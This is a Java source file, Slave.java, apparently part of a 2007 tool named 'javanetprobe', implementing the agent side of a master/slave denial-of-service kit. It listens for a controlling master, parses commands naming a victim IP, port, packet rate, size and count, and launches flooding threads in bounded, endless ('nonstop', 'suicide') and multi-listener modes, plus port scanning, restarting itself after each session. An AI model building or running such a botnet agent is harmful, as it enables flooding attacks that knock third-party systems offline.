/*
 * Slave.java
 *
 * Created on March 21, 2007, 5:56 PM
 *
 * To change this template, choose Tools | Template Manager
 * and open the template in the editor.
 *
 */

package javanetprobe;

/*
 * @author kstse5
 */

import java.io.*;
import java.net.*;
import java.nio.*;
import java.nio.channels.*;
import java.nio.charset.*;
import java.util.*;
import java.util.regex.*;

public class Slave  extends Thread {
    
    //Variable declare:

    private String victimIP = "";
    private int victimPort;
    
    private ServerSocket serverSocket;
    private Socket masterSocket;
    private ObjectInputStream input;
    private ObjectOutputStream output;    
    
    
    private int pktSize;
    private int pktRate;
    private int pktNum;
    private int connections;
    
    private String service[];
    private int serviceNum = 8;

    /** Creates a new instance of Slave */
    public Slave() 
    {
    }
    
    public void run()
    {   
        service = new String[serviceNum];
        service[0] = "attack";
        service[1] = "portscan";
        service[2] = "suiside";
        service[3] = "nonstop";
        service[4] = "terminate";
        service[5] = "httpattack";
        service[6] = "concurrent";
        service[7] = "availableport";
      //  service[8] = "attack";
      //  service[9] = "attack";
      //  service[10] = "attack";
        
        System.out.print("\nSlave start,\nlistening on port " + Global.exploitPort + "\n"); 
        masterSocket = null;
            
            //*********************************************************************
            //                      Accept connection from master
            //*********************************************************************
            
            try {
                serverSocket = new ServerSocket(Global.exploitPort);
                masterSocket = serverSocket.accept();
            } catch (IOException e) { 
                //Try other port if default exploit port can't listen
                Global.exploitPort ++ ;
                new Slave().start();
                return;
            }
            Global.availablePort += " " + Global.exploitPort + "\n";
            //*********************************************************************
            //                      Get parameter from master
            //*********************************************************************
        
            try {   
                 output = new ObjectOutputStream(masterSocket.getOutputStream());
                 output.flush(); 
                 input = new ObjectInputStream(masterSocket.getInputStream());
                 
                 String message;
                 String action;
                 StringTokenizer token;
                 
                 //Sending available attack to Master:
                 output.writeObject("Available Service:");
                 for (int i =0;i<serviceNum;i++)
                     output.writeObject("  " + service[i]);
                 output.flush();               
                 
                 do {
                  message = (String) input.readObject();
                  
                  token = new StringTokenizer (message); 
                  action = token.nextToken();
                  victimIP = token.nextToken();
                  try {
                      victimPort = Integer.valueOf(token.nextToken());
                      pktRate = Integer.valueOf(token.nextToken());
                      pktNum = Integer.valueOf(token.nextToken());
                      pktSize = Integer.valueOf(token.nextToken());
                      connections = Integer.valueOf(token.nextToken());
                  } catch(NumberFormatException n){action = "Error parameter";};
                  
                  System.out.print("\nParameter recieved: " +
                          "\n  action      " + action + 
                          "\n  victim IP   " + victimIP +
                          "\n  victim Port " + victimPort +
                          "\n  packet Rate " + pktRate +
                          "\n  packet Num  " + pktNum +
                          "\n  packet Size " + pktSize +
                          "\n  Connections " + connections);
                  
                  output.writeObject(action + " received");
                  output.flush();
                  
                //*********************************************************************
                //                      Start Attack with victimIP and victimPort
                //*********************************************************************            
                  if (action.matches("attack"))
                     while (connections-- > 0)
                        new Attack(victimIP, victimPort, pktRate, pktNum, pktSize, input, output).start();   
                  
                //*********************************************************************
                //                      Start Port Scan
                //*********************************************************************   
                  else if (action.matches("portscan"))
                  {
                      Ping ping = new Ping(victimIP, victimPort, pktRate);
                  }
                  
                //*********************************************************************
                //                      Kill the slave
                //*********************************************************************   
                  else if (action.matches("suicide"))
                      while (true)
                          new Attack(victimIP, victimPort, pktRate, 1048576, pktSize, input, output).start();
                  
                //*********************************************************************
                //                      Continuous to send packet to target
                //*********************************************************************   
                  else if (action.matches("nonstop"))
                      while (true)
                         new Attack(victimIP, victimPort, pktRate, 1, pktSize, input, output    ).start();
                  
                //*********************************************************************
                //                      Continuous to send packet to target
                //*********************************************************************                   
                  else if (action.matches("concurrent"))
                  {
                      output.writeObject("**Dynamically allocated " + (connections-1) + " port");
                      output.flush();                     
                      while (connections-- > 1)
                      {
                         new Slave().start(); 
                      }
                  }
                  else if (action.matches("availableport"))
                  {
                      output.writeObject("Following port available:\n" + Global.availablePort);
                      output.flush(); 
                  }
                  
                  
                  
                  
                //*********************************************************************
                //                      Error Command Received
                //*********************************************************************                   
                  else if (!action.matches("terminate"))
                  {
                         output.writeObject("Error Command received\n");
                         output.flush();
                  }
                 } while (!action.matches("terminate"));
                 
                    

                serverSocket.close();
                masterSocket.close();
                input.close();
                output.close();
                
                if(action.matches("terminate"))
                    return;
                
            } catch (IOException i) {
                try {
                    serverSocket.close();
                    masterSocket.close();
                    input.close();
                    output.close();
                }catch (IOException i2) {}
            }
              catch (ClassNotFoundException c){
                try {
                    serverSocket.close();
                    masterSocket.close();
                    input.close();
                    output.close();
                }catch (IOException i2) {}
              }  
        
        //restart Server again
        new Slave().start();
    }  
}
